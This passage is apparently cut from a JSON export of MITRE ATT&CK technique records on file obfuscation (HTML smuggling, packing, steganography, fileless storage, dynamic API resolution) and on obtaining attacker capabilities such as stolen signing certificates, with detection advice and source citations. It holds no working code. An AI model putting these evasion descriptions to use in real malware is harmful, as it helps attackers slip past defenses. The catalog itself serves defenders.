Cobalt Gang Oct 2018),(Citation: Kaspersky Lyceum October 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Microsoft Unidentified Dec 2018),(Citation: ClearSky MuddyWater June 2019),(Citation: DFIR Ryuk's Return October 2020),(Citation: Talos Emotet Jan 2019),(Citation: CISA ComRAT Oct 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Cylance Machete Mar 2017),(Citation: FireEye APT19),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Trend Micro Emotet Jan 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Cybereason Astaroth Feb 2019),(Citation: FireEye APT32 May 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: PowerSploit Documentation),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Talos MuddyWater May 2019),(Citation: Talos Frankenstein June 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: Visa FIN6 Feb 2019),(Citation: ESET ComRAT May 2020),(Citation: FireEye APT29 Nov 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cybereason TA505 April 2019),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Cyberint Qakbot May 2021),(Citation: ESET Emotet Dec 2018),(Citation: Cycraft Chimera April 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Microsoft ASR Obfuscation)"}
{"ID":"T1027.004","name":"Obfuscated Files or Information: Compile After Delivery","description":"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)","url":"https://attack.mitre.org/techniques/T1027/004","created":"16 March 2020","last modified":"29 March 2020","version":"1.0","tactics":"Defense Evasion","detection":"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":"Anti-virus, Binary Analysis, Host intrusion prevention systems, Signature-based detection, Static File Analysis","contributors":"Praetorian; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank","permissions required":"User","supports remote":null,"system requirements":"Compiler software (either native to the system or delivered by the adversary)","impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC FoggyWeb September 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Trend Micro njRAT 2018),(Citation: ESET Gamaredon June 2020),(Citation: Anomali Rocke March 2019),(Citation: PaloAlto CardinalRat Apr 2017),"}
{"ID":"T1027.007","name":"Obfuscated Files or Information: Dynamic API Resolution","description":"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)","url":"https://attack.mitre.org/techniques/T1027/007","created":"22 August 2022","last modified":"23 August 2022","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Windows","data sources":"File: File Metadata, Module: Module Load, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Cybereason Bazar July 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Lazarus APT January 2022),(Citation: Microsoft Actinium February 2022),"}
{"ID":"T1027.009","name":"Obfuscated Files or Information: Embedded Payloads","description":"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) \n\nEmbedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)","url":"https://attack.mitre.org/techniques/T1027/009","created":"30 September 2022","last modified":"21 October 2022","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"File: File Creation, File: File Metadata","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":"Nick Cairns, @grotezinfosec","permissions required":null,"supports remote":null,"system requirements":"User","impact type":null,"effective permissions":null,"relationship citations":"(Citation: CISA ComRAT Oct 2020),(Citation: Mandiant APT41),(Citation: GitHub PSImage),(Citation: Securelist Dtrack),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: ESET ComRAT May 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: win10_asr)"}
{"ID":"T1027.011","name":"Obfuscated Files or Information: Fileless Storage","description":"Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ","url":"https://attack.mitre.org/techniques/T1027/011","created":"23 March 2023","last modified":"04 May 2023","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Windows","data sources":"WMI: WMI Creation, Windows Registry: Windows Registry Key Creation","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":"Christopher Peacock; Denise Tan; Mark Wee; Simona David; Xavier Rousseau","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Secureworks REvil September 2019),(Citation: Symantec Volgmer Aug 2014),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: McAfee Sodinokibi October 2019),(Citation: ESET PipeMon May 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: ESET TeleBots Oct 2018),(Citation: Cybereason Valak May 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Waterbug Jun 2019),(Citation: Trustwave Pillowmint June 2020),(Citation: ESET Grandoreiro April 2020),(Citation: SentinelOne Valak June 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Red Canary NETWIRE January 2020),(Citation: Group IB Ransomware September 2020),(Citation: ESET ComRAT May 2020),(Citation: Cylance Sodinokibi July 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: ESET Gelsemium June 2021),(Citation: ESET OceanLotus Mar 2019),(Citation: CISA ComRAT Oct 2020),(Citation: Talos TinyTurla September 2021),(Citation: Prevailion DarkWatchman 2021),(Citation: FireEye APT28),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: ESET Dukes October 2019),(Citation: Profero APT27 December 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Red Canary Qbot),(Citation: Unit 42 Valak July 2020),(Citation: US-CERT Volgmer Nov 2017),(Citation: Intel 471 REvil March 2020),"}
{"ID":"T1027.006","name":"Obfuscated Files or Information: HTML Smuggling","description":"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)","url":"https://attack.mitre.org/techniques/T1027/006","created":"20 May 2021","last modified":"19 May 2022","version":"1.0","tactics":"Defense Evasion","detection":"Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging.(Citation: Outlflank HTML Smuggling 2018) Detecting specific JavaScript and/or HTML5 attribute strings such as <code>Blob</code>, <code>msSaveOrOpenBlob</code>, and/or <code>download</code> may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.\n\nConsider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":"Anti-virus, Static File Analysis, Web Content Filters","contributors":"Jonathan Boucher, @crash_wave, Bank of Canada; Krishnan Subramanian, @krish203; Stan Hegt, Outflank; Vinay Pidathala","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Black Basta October 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: ESET T3 Threat Report 2021),"}
{"ID":"T1027.005","name":"Obfuscated Files or Information: Indicator Removal from Tools","description":"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.","url":"https://attack.mitre.org/techniques/T1027/005","created":"19 March 2020","last modified":"28 April 2022","version":"1.1","tactics":"Defense Evasion","detection":"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":"Anti-virus, Host intrusion prevention systems, Log analysis, Signature-based detection","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos GravityRAT),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Crowdstrike Qakbot October 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: APT3 Adversary Emulation Plan),(Citation: Trend Micro Waterbear December 2019),(Citation: PowerSploit Documentation),(Citation: Symantec Black Vine),(Citation: GitHub PowerSploit May 2012),(Citation: Leonardo Turla Penquin May 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Gazer Aug 2017),(Citation: Palo Alto OilRig April 2017),(Citation: Unit42 OilRig Nov 2018),(Citation: cobaltstrike manual),(Citation: FireEye TEMP.Veles 2018),(Citation: Cyberint Qakbot May 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: CrowdStrike SUNSPOT Implant January 2021),"}
{"ID":"T1027.002","name":"Obfuscated Files or Information: Software Packing","description":"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ","url":"https://attack.mitre.org/techniques/T1027/002","created":"05 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Defense Evasion","detection":"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":"Anti-virus, Heuristic detection, Signature-based detection","contributors":"Filip Kafka, ESET","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: Symantec Elderwood Sept 2012),(Citation: NHS Digital Egregor Nov 2020),(Citation: Unit 42 Rocke January 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: McAfee Lazarus Jul 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: Anomali Rocke March 2019),(Citation: Juniper IcedID June 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: BitDefender Chafer May 2020),(Citation: Symantec Waterbug),(Citation: McAfee Night Dragon),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Zscaler Bazar September 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Kaspersky Tomiris Sep 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Secureworks Karagany July 2019),(Citation: Securelist APT10 March 2021),(Citation: Cisco H1N1 Part 1),(Citation: FOX-IT May 2016 Mofang),(Citation: Medium Babuk February 2021),(Citation: Mandiant No Easy Breach),(Citation: Malwarebytes Dyreza November 2015),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: ESET OceanLotus macOS April 2019),(Citation: Unit42 Sofacy Dec 2018),(Citation: SentinelOne Valak June 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Red Canary NETWIRE January 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: Securelist BlackOasis Oct 2017),(Citation: McAfee Babuk February 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Lee 2013),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: IBM TA505 April 2020),(Citation: ESET GreyEnergy Oct 2018),(Citation: FireEye APT39 Jan 2019),(Citation: Trend Micro TeamTNT),(Citation: McAfee Cuba April 2021),(Citation: FireEye Clandestine Wolf),(Citation: Talos Rocke August 2018),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Mcafee Clop Aug 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: FinFisher Citation),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ASERT Donot March 2018),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Cylance Dust Storm),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: hexed osx.dok analysis 2019),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Donut Github),(Citation: Unit 42 SeaDuke 2015),(Citation: Cybereason Astaroth Feb 2019),(Citation: Cyble Egregor Oct 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: Cybereason Bazar July 2020),(Citation: APT3 Adversary Emulation Plan),(Citation: BlackBerry CostaRicto November 2020),(Citation: Infoblox Lokibot January 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Symantec RAINDROP January 2021),(Citation: Mandiant APT41),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Cybereason Clop Dec 2020),(Citation: Securelist Dropping Elephant),(Citation: Check Point APT31 February 2021),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye APT38 Oct 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),"}
{"ID":"T1027.003","name":"Obfuscated Files or Information: Steganography","description":"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ","url":"https://attack.mitre.org/techniques/T1027/003","created":"05 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Defense Evasion","detection":"Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro EarthLusca 2022),(Citation: Fortinet Diavol July 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Antiy CERT Ramsay April 2020),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: ESET Okrum July 2019),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Symantec RAINDROP January 2021),(Citation: GitHub Invoke-PSImage),(Citation: Trend Micro Tick November 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Group IB Ransomware September 2020),(Citation: Talos Group123),(Citation: CheckPoint Bandook Nov 2020),(Citation: Juniper IcedID June 2020),(Citation: Securelist ScarCruft May 2019),(Citation: ESET Dukes October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 RDAT July 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Volexity PowerDuke November 2016),"}
{"ID":"T1027.008","name":"Obfuscated Files or Information: Stripped Payloads","description":"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)","url":"https://attack.mitre.org/techniques/T1027/008","created":"29 September 2022","last modified":"20 October 2022","version":"1.0","tactics":"Defense Evasion","detection":null,"platforms":"Linux, Windows, macOS","data sources":"File: File Metadata","is sub-technique":true,"sub-technique of":"T1027","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SentinelLabs reversing run-only applescripts 2021),"}
{"ID":"T1588","name":"Obtain Capabilities","description":"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)","url":"https://attack.mitre.org/techniques/T1588","created":"01 October 2020","last modified":"18 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain) Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nConsider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.","platforms":"PRE","data sources":"Certificate: Certificate Registration, Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1588.003","name":"Obtain Capabilities: Code Signing Certificates","description":"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.","url":"https://attack.mitre.org/techniques/T1588/003","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).","platforms":"PRE","data sources":"Malware Repository: Malware Metadata","is sub-technique":true,"sub-technique of":"T1588","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Lunghi Iron Tiger Linux),(Citation: ESET Lazarus Jun 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Symantec Palmerworm Sep 2020),(Citation: IBM MegaCortex),"}
{"ID":"T1588.004","name":"Obtain Capabilities: Digital Certificates","description":"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.","url":"https://attack.mitre.org/techniques/T1588/004","created":"01 October 2020","last modified":"16 October 2021","version":"1.2","tactics":"Resource Development","detection":"Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)\n\nDetection efforts may be focused on related behaviors, such as [Web 